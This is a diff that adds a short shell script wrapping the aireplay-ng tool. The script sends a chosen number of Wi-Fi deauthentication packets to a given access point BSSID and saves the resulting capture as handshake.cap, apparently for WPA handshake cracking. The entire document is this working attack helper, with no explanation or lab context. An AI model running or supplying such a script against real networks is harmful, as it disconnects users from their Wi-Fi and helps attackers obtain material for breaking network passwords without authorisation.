@@ -1,0 +1,8 @@
+if [ $# -ne 3 ]
+then
+echo "Please Enter <network_interface>  <BSSID>  <No_of_packets>"
+else
+sudo aireplay-ng -0 $3 -a $2 $1
+sudo mv newcapture*.cap handshake.cap
+sudo rm newcapture*
+fi
